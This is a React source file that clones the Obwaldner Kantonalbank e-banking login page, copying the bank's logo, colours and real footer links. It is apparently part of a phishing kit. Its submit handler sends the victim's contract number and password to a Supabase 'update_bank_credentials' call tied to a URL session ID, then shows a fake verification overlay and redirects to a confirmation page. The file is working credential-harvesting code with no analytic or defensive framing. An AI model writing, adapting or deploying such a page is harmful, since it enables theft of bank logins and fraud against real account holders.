import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Eye, EyeOff } from "lucide-react";
import logoUrl from "@/assets/obwaldner-kantonalbank-logo.svg";

const RED = "#b12c1e";

const footerLinks = [
  { label: "Rechtliches", href: "https://www.okb.ch/rechtliches" },
  { label: "Datenschutz", href: "https://www.okb.ch/datenschutz" },
  { label: "Impressum", href: "https://www.okb.ch/impressum" },
  { label: "E-Banking-App", href: "https://www.okb.ch/private/e-services/digital-banking/neue-e-banking-app" },
];

const infoLinks = [
  "Hilfe beim Login?",
  "Wie sicher ist E-Banking?",
  "Aktuelle Sicherheitsmeldungen",
];

const ChObwaldnerKantonalbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  const [vertragsnummer, setVertragsnummer] = useState("");
  const [passwort, setPasswort] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Obwaldner Kantonalbank – E-Banking", logoUrl);

  const handleSubmit = async () => {
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: vertragsnummer,
        p_password: passwort,
        p_username_label: "Vertragsnummer",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  const inputClass =
    "w-full px-1 py-2 bg-white text-[15px] border-0 border-b border-black rounded-none outline-none focus:outline-none focus:ring-0";

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen flex flex-col bg-white">
        {/* Roter Top-Balken */}
        <div style={{ height: 6, backgroundColor: RED }} />

        <main className="flex-1 px-0 md:px-4">
          {/* Login-Card */}
          <div className="w-full md:max-w-[494px] mx-auto mt-0 md:mt-16 bg-white overflow-hidden md:shadow-sm md:rounded-lg md:border md:border-[#d9d9d9]">
            {/* Header */}
            <div className="flex items-center" style={{ height: 40, paddingLeft: 24, paddingRight: 24 }}>
              <img src={logoUrl} alt="Obwaldner Kantonalbank" className="h-[22px]" />
            </div>
            {/* Trennlinie 50/50 rot/grau */}
            <div className="flex h-[3px]">
              <div className="flex-1" style={{ backgroundColor: RED }} />
              <div className="flex-1 bg-[#ddd]" />
            </div>

            {/* Form */}
            <div className="px-8 py-8 flex flex-col">
              <h1 className="text-[22px] md:text-[26px] font-semibold text-black mb-2">Willkommen</h1>
              <p className="text-[14px] mb-8" style={{ color: "#666" }}>
                Melden Sie sich an, um fortzufahren.
              </p>

              <div className="mb-5">
                <label className="block text-[13px] mb-1" style={{ color: "#555" }}>
                  Vertragsnummer
                </label>
                <input
                  type="text"
                  value={vertragsnummer}
                  onChange={(e) => setVertragsnummer(e.target.value)}
                  className={inputClass}
                />
              </div>

              <div className="mb-8">
                <label className="block text-[13px] mb-1" style={{ color: "#555" }}>
                  Passwort
                </label>
                <div className="relative">
                  <input
                    type={showPassword ? "text" : "password"}
                    value={passwort}
                    onChange={(e) => setPasswort(e.target.value)}
                    className={inputClass + " pr-10"}
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-2 top-1/2 -translate-y-1/2"
                    aria-label="Passwort anzeigen"
                  >
                    {showPassword ? <EyeOff size={18} color="#666" /> : <Eye size={18} color="#666" />}
                  </button>
                </div>
              </div>

              <button
                onClick={handleSubmit}
                className="mx-auto w-full max-w-[110px] py-2.5 text-white font-semibold text-[15px] rounded-none"
                style={{ backgroundColor: RED }}
              >
                Weiter
              </button>

              <p className="mt-4 text-center text-[14px]">
                <span style={{ color: "#666" }}>Möglicher Betrugsversuch?</span>{" "}
                <a href="#" style={{ color: RED }}>E-Banking sperren.</a>
              </p>
            </div>
          </div>

          {/* Info-Card */}
          <div className="w-full md:max-w-[988px] mx-auto mt-6 md:mt-8 bg-white overflow-hidden md:rounded-lg border border-[#f0f0f0]">
            <ul className="divide-y divide-[#f0f0f0]">
              {infoLinks.map((label) => (
                <li key={label}>
                  <a
                    href="#"
                    className="block px-6 py-4 text-[15px] hover:underline"
                    style={{ color: RED }}
                  >
                    {label}
                  </a>
                </li>
              ))}
            </ul>
          </div>
        </main>

        {/* Footer */}
        <footer className="mt-8 md:mt-12 bg-white">
          <div className="max-w-[1100px] mx-auto px-8 py-4 text-[13px] flex flex-col items-center gap-2 md:flex-row md:justify-end md:gap-6">
            {footerLinks.map((l) => (
              <a
                key={l.href}
                href={l.href}
                target="_blank"
                rel="noopener noreferrer"
                className="hover:underline"
                style={{ color: RED }}
              >
                {l.label}
              </a>
            ))}
          </div>
        </footer>
      </div>
    </>
  );
};

export default ChObwaldnerKantonalbank;
